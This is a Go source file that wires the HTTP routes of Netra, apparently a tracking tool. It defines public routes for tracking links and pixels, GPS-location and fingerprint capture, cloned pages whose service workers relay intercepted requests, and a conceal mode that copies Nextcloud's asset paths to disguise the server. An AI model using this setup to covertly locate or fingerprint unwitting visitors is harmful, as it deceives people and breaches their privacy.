// Package app wires together the full set of HTTP routes Netra serves —
// public capture surfaces, auth/setup, and the guarded admin API — into a
// single http.Handler. It exists so cmd/netra/main.go and the end-to-end
// test suite (test/e2e) build the exact same route table instead of two
// hand-maintained copies that could drift apart.
package app

import (
	"io/fs"
	"log"
	"net/http"
	"time"

	"github.com/spignelon/netra/internal/auth"
	"github.com/spignelon/netra/internal/handlers"
	"github.com/spignelon/netra/web"
)

// NewMux builds the complete Netra route table.
func NewMux(h *handlers.Handler, am *auth.Manager) http.Handler {
	mux := http.NewServeMux()

	// Static assets (embedded). No-cache rather than a long max-age: the
	// embed.FS backing these has no real mtime, so http.FileServer never
	// sends Last-Modified/ETag either — with zero cache headers at all,
	// browsers fall back to their own heuristics and can keep serving a
	// stale JS/CSS file for a while after a redeploy (confirmed: a fixed
	// bug appeared to still be broken purely from a cached old events.js).
	// no-cache forces revalidation before reuse; since there's no
	// validator to revalidate against, that's effectively "always fetch
	// the current version" without giving up caching entirely.
	staticFS, _ := fs.Sub(web.Static, "static")
	staticHandler := http.StripPrefix("/static/", http.FileServer(http.FS(staticFS)))
	mux.Handle("GET /static/", http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Cache-Control", "no-cache")
		staticHandler.ServeHTTP(w, r)
	}))

	// Public capture surfaces.
	mux.HandleFunc("GET /s/{slug}", h.Redirect)
	mux.HandleFunc("GET /i/{slug}", h.Pixel)
	mux.HandleFunc("GET /g/{slug}", h.GPSPage)
	mux.HandleFunc("GET /g/{slug}/view", h.GPSPageView)
	mux.HandleFunc("GET /g/{slug}/sw.js", h.GPSServiceWorker)
	mux.HandleFunc("/g/{slug}/r", h.GPSResource) // any method — relays intercepted fetch/XHR calls too
	mux.HandleFunc("GET /g/{slug}/r-legacy", h.GPSResourceLegacy)
	mux.HandleFunc("POST /g/{slug}/loc", h.GPSCollect)
	mux.HandleFunc("GET /p/{slug}", h.ClonePage)
	mux.HandleFunc("GET /p/{slug}/view", h.ClonePageView)
	mux.HandleFunc("GET /p/{slug}/sw.js", h.ClonePageServiceWorker)
	mux.HandleFunc("/p/{slug}/r", h.ClonePageResource) // any method — relays intercepted fetch/XHR calls too
	mux.HandleFunc("GET /p/{slug}/r-legacy", h.ClonePageResourceLegacy)
	mux.HandleFunc("POST /p/{slug}/fp", h.ClonePageFingerprint)
	mux.HandleFunc("GET /favicon.ico", h.Favicon)
	// Conceal-mode assets, served at paths that mirror Nextcloud's real ones.
	mux.HandleFunc("GET /core/img/logo/logo.svg", h.ConcealLogo)
	mux.HandleFunc("GET /core/img/favicon.svg", h.ConcealCoreFavicon)
	mux.HandleFunc("GET /apps/theming/img/background/jo-myoung-hee-fluid.webp", h.ConcealBackground)

	// Auth + setup.
	mux.HandleFunc("/setup", h.Setup)
	mux.HandleFunc("/login", h.Login)
	mux.HandleFunc("POST /logout", h.Logout)

	// Admin (guarded).
	mux.HandleFunc("GET /admin", am.RequireAuth(h.Dashboard))
	mux.HandleFunc("GET /admin/links", am.RequireAuth(h.LinksList))
	mux.HandleFunc("GET /admin/api/links", am.RequireAuth(h.LinksAPI))
	mux.HandleFunc("POST /admin/links", am.RequireAuth(h.CreateLink))
	mux.HandleFunc("GET /admin/links/{id}", am.RequireAuth(h.LinkDetail))
	mux.HandleFunc("GET /admin/links/{id}/qr.png", am.RequireAuth(h.LinkQR))
	mux.HandleFunc("POST /admin/links/{id}/toggle", am.RequireAuth(h.ToggleLink))
	mux.HandleFunc("POST /admin/links/{id}/delete", am.RequireAuth(h.DeleteLink))
	mux.HandleFunc("POST /admin/links/delete", am.RequireAuth(h.DeleteLinksBulk))
	mux.HandleFunc("GET /admin/events", am.RequireAuth(h.EventsPage))
	mux.HandleFunc("GET /admin/api/events", am.RequireAuth(h.EventsAPI))
	mux.HandleFunc("POST /admin/api/events/delete", am.RequireAuth(h.EventsDelete))
	mux.HandleFunc("GET /admin/api/stats", am.RequireAuth(h.StatsAPI))
	mux.HandleFunc("GET /admin/events.csv", am.RequireAuth(h.EventsCSV))
	mux.HandleFunc("GET /admin/settings", am.RequireAuth(h.SettingsPage))
	mux.HandleFunc("POST /admin/settings/conceal", am.RequireAuth(h.ToggleConceal))
	mux.HandleFunc("POST /admin/settings/webhook", am.RequireAuth(h.SaveWebhook))
	mux.HandleFunc("POST /admin/settings/webhook/test", am.RequireAuth(h.TestWebhook))
	mux.HandleFunc("POST /admin/settings/geoip", am.RequireAuth(h.ToggleGeoIP))
	mux.HandleFunc("POST /admin/settings/refresh", am.RequireAuth(h.SaveAutoRefresh))
	mux.HandleFunc("POST /admin/settings/theme", am.RequireAuth(h.SaveTheme))

	// Root: send to dashboard (or setup/login as appropriate).
	mux.HandleFunc("GET /{$}", func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, "/admin", http.StatusSeeOther)
	})

	return logRequests(mux)
}

// logRequests is a minimal access-log middleware.
func logRequests(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		start := time.Now()
		next.ServeHTTP(w, r)
		log.Printf("%s %s %s", r.Method, r.URL.Path, time.Since(start).Round(time.Millisecond))
	})
}
